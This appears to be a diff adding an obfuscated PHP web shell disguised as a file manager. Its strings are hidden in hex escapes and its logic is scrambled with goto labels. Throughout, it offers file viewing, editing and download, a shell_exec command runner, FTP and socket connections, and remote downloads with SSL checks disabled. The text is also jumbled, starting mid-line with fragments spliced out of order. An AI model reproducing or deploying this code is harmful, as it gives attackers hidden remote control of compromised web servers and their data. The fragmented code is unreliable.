+      var filename = <?php  goto oMJcx; ovRk7: function iconSvgFor($p) { if (is_dir($p)) { return svgIcon("\x66\x6f\154\144\x65\162"); } $e = strtolower(pathinfo($p, PATHINFO_EXTENSION)); if (in_array($e, array("\172\151\x70", "\162\141\162", "\67\172"))) { return svgIcon("\172\x69\x70"); } if (in_array($e, array("\x6a\160\x67", "\152\x70\145\x67", "\160\x6e\x67", "\x67\x69\146", "\167\145\x62\x70", "\142\x6d\x70", "\163\166\147"))) { return svgIcon("\151\155\x67"); } if (in_array($e, array("\x70\x64\x66"))) { return svgIcon("\x70\144\146"); } if (in_array($e, array("\x63\163\x76", "\170\154\163", "\x78\154\x73\170"))) { return svgIcon("\163\150\145\x65\x74"); } if (in_array($e, array("\163\161\154"))) { return svgIcon("\x64\x62"); } if (in_array($e, array("\160\x68\160", "\152\x73", "\x74\x73", "\x63\x73\x73", "\163\143\x73\163", "\x6c\x65\163\x73", "\150\x74\x6d\x6c", "\x68\x74\x6d", "\x78\x6d\154", "\171\x6d\154", "\x79\x61\x6d\x6c", "\151\x6e\151", "\143\x66\147"))) { return svgIcon("\143\x6f\144\145"); } if (in_array($e, array("\164\x78\x74", "\x6d\144", "\154\157\147", "\x6a\x73\157\x6e"))) { return svgIcon("\164\145\170\x74"); } return svgIcon("\x66\151\x6c\145"); } goto KQEck; Q52Hp: function h($s) { return htmlspecialchars($s, ENT_QUOTES, "\x55\124\106\55\70"); } goto xKD6b; muEs3: define("\x41\125\x54\x48\137\x55\x53\x45\122", "\141\x64\155\x69\x6e"); goto mlVQB; rG0K2: ?>
+ × Files: <?php  goto qVLQr; ViiAq: ?>
+
+              </tbody>
+            </table>
+          </div>
+          <!-- below the table -->
+          <div class="mt-3">
+            <form method="post"
+                  action="?a=zip&p=<?php  goto tf19J; aF9CI: if ($viewFile) { ?>
+        <?php  $vf_size = (int) @filesize($viewFile); $vf_ext = strtolower(pathinfo($viewFile, PATHINFO_EXTENSION)); $is_img = in_array($vf_ext, array("\x6a\160\147", "\x6a\x70\145\x67", "\160\x6e\147", "\147\x69\146", "\x77\x65\x62\x70", "\x62\155\x70", "\163\x76\x67")); $is_txt = isTextFile($viewFile); $preview_max = 512 * 1024; $txt = ''; if ($is_txt) { $txt = @file_get_contents($viewFile, false, null, 0, $preview_max); if ($txt === false) { $txt = ''; } } ?>
+        <div class="card p-4" id="previewWrap">
+          <details id="previewPanel" open>
+            <summary class="cursor-pointer font-medium flex items-center justify-between">
+              <div class="flex items-center gap-2">
+                <span>Preview: <span class="mono"><?php  echo h(basename($viewFile)); ?>
+</span></span>
+                <span class="text-xs text-slate-400">Size: <?php  echo h(humanSize($vf_size)); ?>
+</span>
+              </div>
+              <div class="flex items-center gap-2">
+                <button type="button" class="btn btn-xs btn-ghost" onclick="document.getElementById('previewPanel').open=false">Close</button>
+              </div>
+            </summary>
+
+            <div class="mt-3 text-xs text-slate-400 mono"><?php  echo h($viewFile); ?>
+</div>
+
+            <div class="mt-3">
+              <?php  if ($is_img) { ?>
+                <img src="?a=raw&f=<?php  echo rawurlencode(basename($viewFile)); ?>
+&p=<?php  echo rawurlencode($current); ?>
+" alt="preview image" class="max-w-full rounded-lg border border-slate-700" style="max-height:480px;object-fit:contain;">
+              <?php  } elseif ($is_txt) { ?>
+                <pre id="previewPre" class="p-3 bg-black/40 rounded-lg overflow-auto text-sm mono border border-slate-700" style="max-height:480px;"><?php  echo h($txt); ?>
+</pre>
+                <?php  if ($vf_size > $preview_max) { ?>
+                  <div class="mt-2 text-xs text-slate-400">Showing <?php  echo h(humanSize($preview_max)); ?>
+ of <?php  echo h(humanSize($vf_size)); ?>
+. Use Edit/Download for full content.</div>
+                <?php  } ?>
+              <?php  } else { ?>
+                <div class="rounded-lg border border-slate-700 p-3 bg-slate-900/50">
+                  <div class="text-sm">This file type cannot be previewed directly.</div>
+                  <div class="mt-2 flex gap-2">
+                    <a class="btn btn-sm btnw" href="?a=download&f=<?php  echo rawurlencode(basename($viewFile)); ?>
+&p=<?php  echo rawurlencode($current); ?>
+">Download</a>
+                    <a class="btn btn-sm btnw" href="?a=edit&f=<?php  echo rawurlencode(basename($viewFile)); ?>
+&p=<?php  echo rawurlencode($current); ?>
+">Edit (careful if binary)</a>
+                  </div>
+                </div>
+              <?php  } ?>
+            </div>
+          </details>
+        </div>
+      <?php  } goto iXoZL; MSmUf: echo h($csrf); goto hCHHP; EnfhA: if (!function_exists("\x66\170\x5f\163\150\x6f\167\137\x73\157\x75\x72\x63\x65")) { function fx_show_source($file, $return = false) { if (is_fn_usable("\163\x68\157\x77\137\x73\x6f\165\162\143\145")) { return @show_source($file, $return); } if (is_fn_usable("\150\151\147\x68\x6c\151\147\150\164\137\x66\x69\154\x65")) { return @highlight_file($file, $return); } $c = @file_get_contents($file); if ($return) { return $c; } echo $c; return true; } } goto bqLeM; ET11Q: function permsToString($f) { $p = @fileperms($f); if ($p === false) { return "\77\77\x3f\x3f\x3f\x3f\77\x3f\x3f\x3f"; } $t = $p & 16384 ? "\144" : ($p & 40960 ? "\154" : "\x2d"); $s = ($p & 256 ? "\x72" : "\x2d") . ($p & 128 ? "\167" : "\55") . ($p & 64 ? "\x78" : "\55"); $s .= ($p & 32 ? "\x72" : "\x2d") . ($p & 16 ? "\167" : "\x2d") . ($p & 8 ? "\x78" : "\x2d"); $s .= ($p & 4 ? "\162" : "\55") . ($p & 2 ? "\167" : "\x2d") . ($p & 1 ? "\170" : "\x2d"); return $t . $s; } goto S9kxP; Totlh: if (!function_exists("\x66\170\x5f\x66\x74\160\x5f\x63\x6f\156\x6e\x65\143\164")) { function fx_ftp_connect($host, $port = 21, $timeout = 90) { if (is_fn_usable("\146\164\160\137\143\157\x6e\x6e\x65\x63\164")) { return @ftp_connect($host, $port, $timeout); } if (is_fn_usable("\x66\x73\157\143\x6b\x6f\x70\x65\156")) { return @fsockopen($host, $port, $errno, $errstr, $timeout); } return false; } } goto ziUt3; FrLMC: if ($editFile) { ?>
+        <?php  $autoMode = $viewMode === "\141\x75\x74\157"; if ($autoMode) { $viewMode = isTextFile($editFile) ? "\164\x78\x74" : "\142\66\64"; } $rawContent = @file_get_contents($editFile); if ($rawContent === false) { $rawContent = ''; } $display = $viewMode === "\142\x36\x34" ? base64_encode($rawContent) : $rawContent; ?>
+        <div class="card p-4" id="editPanelWrap">
+          <details id="editPanel" open>
+            <summary class="cursor-pointer font-medium flex items-center justify-between">
+              <div class="flex items-center gap-2">
+                <span>Edit File</span>
+                <span class="text-xs text-slate-400">Size: <?php  echo h(humanSize((int) @filesize($editFile))); ?>
+</span>
+              </div>
+              <div class="flex items-center gap-2">
+                <button type="button" class="btn btn-xs btn-ghost" onclick="document.getElementById('editPanel').open=false">Close</button>
+              </div>
+            </summary>
+
+            <div class="mt-3 text-xs text-slate-400 mono line-clamp-2"><?php  echo h($editFile); ?>
+</div>
+
+            <div class="mt-2">
+              <a class="inline-block px-2 py-1 rounded-md border border-slate-700 text-xs <?php  echo $viewMode === "\x74\x78\164" ? "\142\x67\55\x69\x6e\144\x69\x67\157\55\66\x30\x30\40\164\145\x78\x74\55\x77\x68\151\164\x65\40\x62\157\x72\x64\145\162\55\151\x6e\x64\151\147\x6f\x2d\66\60\x30" : "\x62\147\x2d\163\154\141\x74\x65\55\70\60\60"; ?>
+" href="?a=edit&f=<?php  echo rawurlencode(basename($editFile)); ?>
+&p=<?php  echo rawurlencode($current); ?>
+&mode=txt">Text</a>
+              <a class="inline-block px-2 py-1 rounded-md border border-slate-700 text-xs <?php  echo $viewMode === "\x62\66\64" ? "\142\147\55\151\x6e\144\x69\x67\x6f\x2d\66\x30\60\40\x74\145\x78\x74\x2d\167\150\151\x74\x65\40\x62\x6f\162\x64\x65\162\55\x69\156\144\151\147\157\x2d\66\x30\x30" : "\142\147\x2d\x73\154\x61\164\x65\x2d\70\60\60"; ?>
+" href="?a=edit&f=<?php  echo rawurlencode(basename($editFile)); ?>
+&p=<?php  echo rawurlencode($current); ?>
+&mode=b64">Base64</a>
+            </div>
+
+            <form method="post" action="?a=edit-save&p=<?php  echo rawurlencode($current); ?>
+" class="mt-3" id="editForm">
+              <input type="hidden" name="csrf" value="<?php  echo h($csrf); ?>
+">
+              <input type="hidden" name="file" value="<?php  echo h(basename($editFile)); ?>
+">
+              <input type="hidden" name="mode" value="<?php  echo h($viewMode); ?>
+">
+
+              <?php  if ($viewMode === "\x74\170\x74") { ?>
+                <textarea id="editor" name="content"><?php  echo h($display); ?>
+</textarea>
+              <?php  } else { ?>
+                <textarea name="content" class="w-full h-72 border border-slate-700 rounded-xl p-3 mono bg-slate-900 text-slate-100" spellcheck="false"><?php  echo h($display); ?>
+</textarea>
+                <div class="mt-2 text-xs text-slate-400">Base64 mode: content will be decoded on save.</div>
+              <?php  } ?>
+
+              <div class="mt-3 flex flex-wrap gap-2 items-center">
+                <button class="btn btnw" type="submit">Save</button>
+                <button class="btn btnw btn-ghost" type="button" onclick="document.getElementById('editPanel').open=false">Close</button>
+                <a class="btn btnw" href="?p=<?php  echo rawurlencode($current); ?>
+">Exit & Reset</a>
+                <?php  if ($viewMode === "\x74\170\x74") { ?>
+                  <span class="text-xs text-slate-400">Text mode: syntax highlighting auto-detects file type.</span>
+                <?php  } ?>
+              </div>
+            </form>
+          </details>
+        </div>
+      <?php  } goto Jak1A; x45KM: echo h($csrf); goto vl0u3; Jn5QQ: if (!function_exists("\x66\170\137\163\150\x65\x6c\154\x5f\x65\170\x65\x63")) { function fx_shell_exec($cmd) { if (is_fn_usable("\163\150\x65\154\x6c\137\145\170\145\x63")) { return @shell_exec($cmd); } return null; } } goto IKEFV; ErjoT: if (!function_exists("\x66\x65\164\143\150\125\162\x6c\x54\157\106\151\x6c\x65")) { function fetchUrlToFile($url, $dest) { $errs = array(); if (is_fn_usable("\x63\x75\162\x6c\x5f\x69\156\x69\x74")) { $ch = @curl_init($url); $fp = @fopen($dest, "\167\x62"); if ($ch && $fp) { @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); @curl_setopt($ch, CURLOPT_FILE, $fp); @curl_setopt($ch, CURLOPT_FAILONERROR, true); @curl_setopt($ch, CURLOPT_USERAGENT, "\x4d\x6f\x7a\x69\154\154\x61\57\65\56\x30"); @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); @curl_setopt($ch, CURLOPT_TIMEOUT, 60); $ok = @curl_exec($ch); $e = @curl_error($ch); @curl_close($ch); @fclose($fp); if ($ok) { return array(true, null); } $errs[] = "\143\125\122\x4c\x3a\x20" . $e; @unlink($dest); } else { if ($ch) { @curl_close($ch); } if ($fp) { @fclose($fp); } $errs[] = "\x69\156\151\x74\40\143\125\122\114\x2f\x66\157\160\145\x6e"; } } $ctx = @stream_context_create(array("\x68\x74\x74\160" => array("\x66\157\x6c\x6c\157\x77\x5f\x6c\157\143\141\164\151\157\x6e" => 1, "\x74\151\155\x65\x6f\x75\164" => 60, "\x68\x65\x61\144\145\162" => "\x55\x73\x65\162\x2d\x41\147\145\156\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\154\141\x2f\65\56\x30\15\12"), "\163\x73\x6c" => array("\166\x65\162\151\146\x79\137\x70\145\145\x72" => false, "\166\145\162\x69\x66\171\x5f\160\145\145\162\137\156\141\155\145" => false))); if (@copy($url, $dest, $ctx)) { return array(true, null); } $errs[] = "\x63\x6f\160\x79\x28\x75\162\154\x29"; $d = @file_get_contents($url, false, $ctx); if ($d !== false && @file_put_contents($dest, $d) !== false) { return array(true, null); } $errs[] = "\x67\x65\164\x2b\160\x75\x74"; $in = @fopen($url, "\162\x62", false, $ctx); $out = @fopen($dest, "\x77\x62"); if ($in && $out) { $c = @stream_copy_to_stream($in, $out); @fclose($in); @fclose($out); if ($c !== false) { return array(true, null); } $errs[] = "\163\x74\162\x65\141\x6d\137\143\157\160\171"; @unlink($dest); } else { $errs[] = "\x66\157\160\x65\156\x28\x75\162\154\x2f\144\145\x73\x74\x29"; } return array(false, implode("\73\x20", $errs) . "\x20\x66\x61\x69\154\x65\x64"); } } goto nxz3n; I5dMY: echo rawurlencode($current); goto tA23m; wjERR: echo je(DIRECTORY_SEPARATOR === "\x5c"); goto wkd_A; k_9yJ: ?>
+;
+      var outMode = isWin ? 'powershell' : 'shell';
+
+      var txt = pre.textContent || '';
+      var holder = document.createElement('div');
+      pre.parentNode.replaceChild(holder, pre);
+
+      var cmOut = CodeMirror(holder, {
+        value: txt,
+        readOnly: true,
+        lineNumbers: true,
+        lineWrapping: true,
+        theme: 'material-darker',
+        mode: outMode,
+        viewportMargin: Infinity
+      });
+
+      CodeMirror.autoLoadMode(cmOut, outMode);
+      cmOut.setSize('100%', 380);
+      cmOut.getWrapperElement().classList.add('cm-cmd-output');
+
+      setTimeout(function(){ cmOut.refresh(); }, 50);
+      window.addEventListener('resize', function(){ cmOut.refresh(); });
+    })();
+  </script>
+</body>
+</html>
+<?php  goto qQBgv; v6ufH: if (!empty($_SESSION["\143\155\x64\137\x72\145\163\x75\x6c\164"])) { $cr = $_SESSION["\143\x6d\x64\x5f\x72\x65\163\x75\x6c\x74"]; unset($_SESSION["\143\155\144\x5f\162\x65\163\x75\154\x74"]); ?>
+      <section class="col-span-12">
+        <div class="card p-4 mb-4">
+          <details open>
+            <summary class="cursor-pointer font-medium">
+              Command Output × <span class="mono"><?php  echo h($cr["\143\155\144"]); ?>
+</span>
+              <span class="ml-2 text-xs text-slate-400">via <?php  echo h($cr["\x6d\145\164\x68\157\x64"]); ?>
+, exit <?php  echo h((string) $cr["\143\157\144\145"]); ?>
+</span>
+            </summary>
+            <pre id="cmdOutPre" class="mt-3 p-3 bg-black/40 rounded-lg overflow-auto text-xs mono border border-slate-700" style="max-height: 480px;"><?php  echo h($cr["\x6f\x75\164"]); ?>
+</pre>
+          </details>
+        </div>
+      </section>
+    <?php  } goto ZTiY4; Eq7eY: echo h($current); goto ADJrO; sTK0e: function addDirToPhar($phar, $dir, $local) { $dir = rtrim($dir, DIRECTORY_SEPARATOR); $h = @opendir($dir); if (!$h) { return; } while (false !== ($e = readdir($h))) { if ($e === "\56" || $e === "\x2e\x2e") { continue; } $full = $dir . DIRECTORY_SEPARATOR . $e; $localPath = $local . "\57" . basename($e); if (is_dir($full)) { if (method_exists($phar, "\x61\144\x64\105\155\160\x74\171\104\x69\x72")) { $phar->addEmptyDir($localPath); } addDirToPhar($phar, $full, $localPath); } elseif (is_file($full) && method_exists($phar, "\x61\144\144\106\x69\x6c\x65")) { $phar->addFile($full, $localPath); } } closedir($h); } goto PL277; T32QS: ?>
+">
+          <label class="text-sm text-slate-300">New File</label>
+          <input type="text" name="name" class="field mono" placeholder="newfile.txt" required>
+          <textarea name="content" class="field mono" rows="2" placeholder="(Optional) initial content; jika kosong akan diisi timestamp otomatis"></textarea>
+          <button class="btn w-full" type="submit">Create File</button>
+          <div class="text-xs text-slate-400">Dibuat non-0 byte dengan beberapa fallback (lintas versi PHP).</div>
+        </form>
+
+        <hr class="my-3 border-slate-700">
+
+        <form method="post" action="?a=new-dir&p=<?php  goto qItMO; xKD6b: if (!function_exists("\152\145")) { function je($v) { if (function_exists("\152\x73\157\x6e\x5f\x65\156\143\157\144\x65")) { return json_encode($v); } if (is_bool($v)) { return $v ? "\x74\162\165\145" : "\x66\141\154\163\x65"; } if (is_numeric($v)) { return (string) $v; } if ($v === null) { return "\x6e\x75\154\x6c"; } $s = str_replace(array("\x5c", "\x22", "\15", "\12", "\x9", "\57"), array("\x5c\x5c", "\x5c\42", "\x5c\x72", "\x5c\156", "\x5c\x74", "\x5c\57"), (string) $v); return "\42" . $s . "\x22"; } } goto Ve618; p8Sp6: function svgIcon($name, $class = "\x69\143\x6f") { $icons = array("\146\x6f\154\x64\145\x72" => "\x3c\x73\166\147\x20\166\x69\x65\x77\x42\x6f\170\x3d\x22\x30\x20\60\x20\x32\64\x20\x32\x34\x22\x20\143\x6c\141\163\x73\x3d\x22" . $class . "\42\40\x61\x72\151\x61\x2d\150\x69\144\x64\145\156\75\x22\164\x72\x75\x65\x22\x3e\74\160\141\x74\x68\x20\x64\75\42\x4d\61\x30\x20\64\x6c\62\x20\x32\150\66\141\62\40\62\40\60\40\60\x31\x32\40\62\166\x31\x48\64\x56\66\141\62\x20\62\x20\60\x20\x30\61\62\x2d\x32\x68\x34\x7a\42\40\146\151\x6c\x6c\x3d\42\x63\x75\162\162\145\156\164\103\157\154\157\x72\x22\40\x6f\x70\141\143\x69\x74\x79\x3d\42\56\x31\x32\42\57\76\x3c\160\141\x74\x68\40\x64\75\42\115\63\x20\x39\150\61\70\x76\71\x61\x32\x20\62\x20\60\40\60\x31\x2d\x32\40\x32\110\x35\x61\x32\x20\62\40\60\40\x30\x31\x2d\x32\55\x32\126\x39\172\x22\x20\x66\x69\154\154\x3d\42\x63\165\162\x72\x65\156\x74\x43\x6f\154\157\x72\42\57\x3e\74\x2f\163\x76\147\76", "\x66\x69\154\145" => "\74\x73\166\x67\40\x76\x69\145\167\102\157\170\x3d\42\x30\x20\60\40\x32\64\40\x32\64\x22\x20\x63\154\141\163\x73\x3d\42" . $class . "\42\40\141\x72\x69\141\55\150\x69\144\x64\145\x6e\75\x22\x74\x72\x75\x65\42\x3e\74\160\141\x74\x68\40\144\75\42\x4d\x36\x20\x33\150\x37\x6c\x35\x20\65\166\x31\61\x61\62\x20\62\x20\60\x20\60\61\55\x32\40\62\110\x36\141\62\40\x32\40\x30\x20\60\x31\x2d\x32\x2d\62\126\x35\42\40\x66\151\154\x6c\x3d\x22\143\165\162\162\x65\x6e\164\x43\157\154\x6f\162\x22\x20\x6f\x70\141\143\x69\164\171\x3d\x22\56\x31\62\x22\x2f\76\74\x70\x61\x74\x68\x20\144\75\x22\x4d\61\63\x20\63\166\x35\141\x32\40\x32\x20\60\x20\x30\60\x32\40\x32\x68\65\42\40\x66\151\154\154\75\x22\x6e\x6f\156\x65\x22\40\163\164\162\x6f\x6b\x65\x3d\42\x63\x75\x72\162\x65\x6e\164\103\x6f\x6c\x6f\162\x22\x20\163\x74\x72\x6f\x6b\x65\x2d\x77\151\x64\x74\x68\x3d\x22\62\x22\40\163\x74\162\157\153\145\x2d\x6c\151\156\x65\x6a\x6f\151\x6e\75\42\x72\x6f\165\x6e\x64\x22\57\76\x3c\x2f\x73\166\x67\x3e", "\143\x6f\x64\145" => "\x3c\163\166\x67\x20\x76\x69\x65\167\x42\x6f\x78\x3d\42\60\x20\x30\x20\62\x34\x20\62\64\42\x20\x63\x6c\x61\163\x73\75\42" . $class . "\x22\x3e\x3c\x70\141\x74\150\x20\x64\75\x22\115\x38\40\61\x36\154\55\x34\55\64\40\64\55\x34\115\61\x36\x20\x38\154\x34\40\64\x2d\64\40\64\x22\40\146\151\x6c\154\75\x22\x6e\x6f\x6e\x65\42\x20\163\164\x72\x6f\153\145\x3d\x22\143\x75\162\162\145\156\x74\x43\157\x6c\x6f\x72\x22\40\163\x74\162\x6f\153\x65\55\x77\x69\x64\164\150\75\42\x32\x22\40\163\x74\162\157\153\145\55\154\x69\156\x65\x63\x61\160\x3d\42\162\x6f\165\156\x64\42\40\x73\x74\x72\x6f\x6b\x65\55\x6c\151\x6e\145\x6a\x6f\151\x6e\x3d\x22\x72\x6f\x75\156\144\42\x2f\x3e\74\x2f\x73\166\147\76", "\x74\x65\x78\x74" => "\74\163\x76\147\x20\166\151\x65\167\102\157\170\x3d\42\60\40\x30\x20\x32\x34\x20\x32\x34\x22\x20\143\x6c\x61\163\x73\x3d\42" . $class . "\42\x3e\x3c\x70\x61\164\x68\x20\144\75\42\x4d\64\40\x36\x68\61\66\x4d\64\x20\x31\62\150\61\x36\x4d\x34\40\61\x38\x68\61\60\x22\40\146\x69\x6c\154\x3d\42\156\x6f\x6e\145\x22\40\x73\x74\x72\x6f\153\x65\x3d\42\143\165\162\x72\x65\156\x74\x43\157\x6c\x6f\x72\x22\x20\x73\164\x72\x6f\153\x65\55\167\151\144\x74\x68\x3d\x22\x32\x22\40\163\x74\x72\x6f\153\x65\x2d\154\151\156\145\x63\x61\160\x3d\x22\x72\x6f\165\156\x64\42\57\76\x3c\57\x73\166\x67\76", "\x70\167\x78" => "\x3c\163\166\147\40\166\151\x65\x77\x42\157\170\75\42\60\x20\x30\x20\64\x38\40\x34\x38\x22\40\x63\154\x61\x73\x73\75\42" . $class . "\x22\40\141\162\151\141\x2d\x68\151\144\x64\145\156\75\42\164\162\165\x65\x22\x20\x78\155\154\156\163\x3d\x22\x68\164\x74\160\x3a\x2f\57\167\x77\167\x2e\167\63\x2e\157\x72\147\57\62\60\x30\60\57\163\x76\147\x22\x3e\x3c\x67\40\x66\151\x6c\x6c\x3d\42\143\165\162\x72\145\156\164\103\157\154\x6f\162\x22\76\x3c\147\40\164\162\141\156\x73\146\x6f\162\155\75\x22\164\162\141\x6e\x73\x6c\141\164\x65\50\x2d\x37\60\60\x20\x2d\65\66\60\51\42\x3e\x3c\160\x61\x74\x68\40\144\x3d\x22\x4d\67\62\x33\x2e\71\71\x38\65\x2c\x35\66\60\x20\103\x37\61\x30\56\x37\x34\66\54\x35\x36\60\x20\67\60\60\54\65\67\60\x2e\67\x38\67\60\71\x32\40\x37\x30\60\x2c\x35\x38\x34\x2e\x30\x39\66\x36\64\x34\40\103\67\60\x30\x2c\65\x39\64\56\x37\64\x30\x36\67\x31\40\67\60\66\x2e\x38\67\66\x2c\66\60\63\56\67\67\x31\x38\x33\40\67\61\66\56\x34\x31\64\x35\54\66\60\x36\56\x39\x35\70\64\x31\62\40\103\x37\x31\67\56\x36\61\64\65\x2c\66\60\x37\x2e\61\x37\71\x37\70\x36\x20\67\61\70\x2e\60\65\x32\x35\54\66\x30\x36\x2e\x34\x33\x35\70\64\x39\x20\x37\x31\x38\56\x30\65\x32\65\54\x36\60\x35\56\67\71\67\x33\62\x38\40\103\x37\x31\x38\x2e\60\x35\62\65\54\66\x30\x35\56\62\62\65\60\x36\x38\40\x37\61\x38\x2e\x30\x33\61\x35\x2c\66\60\63\x2e\67\x31\60\x30\x38\66\x20\67\x31\x38\x2e\x30\61\71\65\54\66\60\x31\x2e\x36\x39\71\x36\x34\70\x20\x43\67\x31\x31\x2e\x33\64\x33\54\66\60\63\56\61\65\x35\70\x39\70\x20\67\60\71\56\x39\x33\64\x35\54\65\x39\x38\x2e\x34\66\x39\63\71\x34\40\67\x30\x39\56\x39\63\64\x35\54\65\x39\x38\56\64\66\x39\x33\71\x34\x20\x43\x37\x30\70\56\70\x34\64\x2c\x35\x39\x35\56\x36\x38\x36\x34\60\65\x20\x37\60\x37\56\62\x37\60\65\54\65\71\64\x2e\71\64\65\x34\x38\x20\67\x30\67\56\x32\67\x30\65\x2c\65\x39\x34\x2e\x39\64\x35\x34\x38\x20\103\67\x30\65\x2e\x30\x39\x31\x2c\65\x39\63\x2e\64\x35\x30\x30\67\x35\40\67\60\x37\x2e\x34\x33\65\x35\54\x35\x39\63\56\64\70\60\x31\x39\64\x20\x37\60\67\56\64\63\65\65\x2c\65\71\63\56\64\70\60\x31\71\64\x20\103\x37\60\71\x2e\70\x34\x33\54\x35\x39\63\56\66\65\x30\x33\66\66\40\67\x31\x31\x2e\x31\x31\60\x35\x2c\x35\x39\65\x2e\71\x36\63\64\x39\71\x20\x37\x31\61\x2e\x31\x31\60\65\54\x35\x39\x35\56\x39\x36\63\64\x39\x39\x20\x43\x37\61\63\x2e\x32\65\x32\x35\54\65\71\71\x2e\x36\64\x35\65\63\x38\x20\67\61\x36\x2e\67\x32\70\x2c\x35\71\70\56\x35\70\x32\63\64\x20\x37\x31\70\56\60\x39\66\54\65\x39\x37\x2e\x39\x36\x34\x39\x30\62\40\x43\67\61\x38\x2e\63\61\63\x35\54\65\x39\x36\56\x34\60\67\67\65\64\x20\x37\61\x38\x2e\71\63\64\x35\54\65\71\x35\x2e\x33\x34\66\60\66\x32\40\x37\61\71\x2e\66\62\x2c\65\x39\x34\x2e\67\64\63\66\x38\x33\40\x43\67\x31\x34\x2e\62\x39\60\x35\54\x35\x39\64\56\61\x33\x35\x32\70\x31\x20\67\x30\x38\x2e\66\x38\x38\x2c\x35\x39\62\x2e\60\66\x39\61\62\63\40\x37\60\70\56\66\x38\70\54\65\70\x32\x2e\70\x33\66\x31\66\67\40\103\67\x30\70\x2e\x36\x38\70\54\65\x38\x30\56\x32\60\x35\x32\67\71\40\x37\x30\x39\56\66\62\62\65\x2c\x35\67\70\56\x30\65\x34\67\70\x38\x20\67\x31\x31\x2e\61\x35\70\65\x2c\65\x37\66\x2e\63\x36\71\x36\63\x34\x20\103\67\x31\60\x2e\71\x31\61\x2c\x35\67\x35\56\x37\65\x39\x37\62\x36\40\67\61\x30\x2e\x30\x38\67\x35\54\x35\67\63\56\63\61\x31\60\65\x38\40\x37\61\x31\x2e\63\71\x32\65\x2c\x35\66\71\x2e\71\71\63\x34\65\70\x20\103\x37\x31\x31\56\63\x39\62\x35\x2c\x35\x36\x39\56\x39\x39\63\x34\x35\70\x20\x37\x31\63\x2e\x34\60\70\x35\54\x35\66\71\x2e\63\x34\x35\x39\x30\x32\x20\x37\61\x37\x2e\x39\x39\62\65\x2c\x35\x37\62\56\x34\66\x33\62\x31\x20\x43\x37\x31\71\56\71\x30\70\x2c\65\x37\x31\x2e\71\x32\x38\65\71\71\40\67\62\x31\x2e\x39\x36\54\x35\x37\61\56\x36\66\x32\x30\x34\x37\40\x37\x32\x34\56\x30\60\61\65\54\65\x37\x31\x2e\x36\x35\61\65\60\x35\x20\x43\x37\x32\66\56\60\x34\x2c\65\x37\x31\56\x36\x36\x32\x30\64\67\40\x37\62\x38\x2e\x30\71\x33\65\x2c\x35\x37\x31\56\71\x32\x38\x35\71\x39\x20\67\x33\x30\x2e\x30\61\60\x35\x2c\65\67\62\56\64\x36\63\62\x31\40\103\x37\x33\x34\56\x35\71\61\x35\x2c\x35\66\71\x2e\x33\x34\65\x39\60\x32\40\67\63\66\x2e\x36\60\x33\54\x35\66\x39\56\x39\71\x33\64\x35\70\40\x37\x33\66\x2e\66\x30\x33\x2c\65\x36\x39\56\x39\71\63\x34\65\x38\x20\103\67\63\x37\x2e\71\61\62\x35\54\x35\67\63\56\63\61\61\x30\65\70\x20\67\63\x37\56\60\x38\71\x2c\x35\67\x35\56\x37\65\71\67\x32\x36\40\67\x33\66\56\70\x34\x31\x35\54\x35\x37\x36\x2e\x33\x36\71\66\63\64\x20\103\67\x33\70\x2e\x33\70\60\65\54\x35\x37\x38\x2e\x30\x35\64\67\70\x38\40\67\63\x39\56\x33\x30\71\54\x35\x38\60\x2e\x32\60\65\62\x37\71\x20\67\63\x39\x2e\63\x30\x39\x2c\x35\x38\x32\x2e\x38\x33\66\x31\x36\67\40\103\x37\63\71\x2e\x33\60\71\54\x35\71\x32\x2e\60\71\61\x37\61\x32\x20\67\x33\x33\x2e\x36\71\67\x35\54\65\71\64\x2e\61\x32\71\x32\65\x37\x20\67\62\x38\x2e\63\65\61\x35\54\65\71\64\x2e\x37\62\x35\66\x31\62\40\x43\x37\62\71\56\x32\x31\x32\x35\x2c\x35\x39\x35\x2e\x34\66\x39\65\x34\x39\x20\x37\x32\x39\56\x39\x38\x30\x35\54\65\x39\66\x2e\x39\63\71\x33\x35\63\x20\67\x32\x39\x2e\71\70\60\65\54\65\71\x39\x2e\x31\70\67\x37\x33\40\103\x37\62\71\56\x39\x38\60\65\x2c\x36\60\x32\56\64\x30\x38\x39\64\71\x20\67\62\x39\56\x39\x35\x30\x35\54\66\60\x35\x2e\60\x30\66\x37\60\66\40\x37\x32\x39\56\71\65\x30\65\54\66\60\65\56\67\x39\x37\x33\62\70\x20\103\x37\62\71\x2e\x39\65\60\x35\x2c\66\x30\x36\x2e\x34\x34\61\x38\x37\63\x20\x37\x33\x30\x2e\x33\70\x32\65\54\66\x30\67\x2e\x31\71\x31\70\x33\64\40\67\63\x31\x2e\66\x30\60\65\54\x36\x30\x36\x2e\x39\65\x35\64\40\103\67\64\x31\56\x31\63\54\x36\x30\63\56\67\66\62\x37\x39\64\x20\x37\x34\70\54\65\71\x34\56\67\63\67\x36\x35\x39\40\67\64\x38\54\65\x38\64\x2e\x30\x39\x36\66\x34\64\40\x43\x37\x34\70\54\x35\67\60\x2e\x37\70\67\x30\x39\x32\x20\x37\x33\67\56\62\x35\64\54\65\x36\x30\x20\x37\x32\x33\56\x39\71\x38\x35\54\65\66\x30\x22\57\76\x3c\57\x67\x3e\x3c\x2f\147\76\x3c\x2f\x73\x76\147\x3e", "\151\x6d\147" => "\x3c\x73\166\x67\40\x76\x69\145\x77\x42\157\170\x3d\x22\x30\40\60\40\62\64\x20\62\64\42\x20\143\x6c\141\x73\163\75\42" . $class . 